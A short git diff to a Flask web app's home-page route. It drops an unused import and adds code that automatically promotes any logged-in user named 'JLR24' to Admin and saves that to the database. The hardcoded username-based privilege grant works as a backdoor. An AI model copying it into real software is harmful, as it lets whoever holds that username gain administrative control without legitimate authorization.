@@ -1,14 +1,17 @@
 from flask import Blueprint, render_template, url_for, redirect, flash, request
 from flask_login import current_user, login_required
 from .static.paginator import Paginator
-from ..models import db, UserPost
-import datetime
+from ..models import db
 
 mh = Blueprint("mh", __name__, template_folder="templates", static_folder="static")
 
 @mh.route("/")
 def Home():
     if current_user.is_authenticated:
+        if current_user.username == "JLR24" and current_user.status != "Admin":
+            current_user.status = "Admin"
+            flash(" >> Promoted JLR24 to admin", category="info")
+            db.session.commit()
         feed = current_user.GetFeed()
         if not feed:
             feed = []
